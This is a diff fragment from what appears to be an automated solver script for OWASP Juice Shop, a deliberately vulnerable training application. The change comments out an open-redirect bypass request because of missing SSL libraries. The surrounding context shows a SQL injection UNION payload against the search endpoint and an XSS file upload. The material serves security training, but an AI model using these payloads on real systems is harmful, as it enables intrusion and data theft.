@@ -80,7 +80,8 @@ requests.get(url+'/rest/products/search',params={'q':'qwert\')) UNION SELECT id,
 requests.post(url+'/file-upload', files={'file':open('file-upload/Video XSS.zip','rb')})
 requests.get(url+'/promotion')
 # ---- Whitelist Bypass (Enforce a redirect to a page you are not supposed to redirect to.)
-requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')
+# Removed as system does not have ssl libs
+#requests.get(url+'/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop')
 
 # ==== No required action - Login challenges ====
 # ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
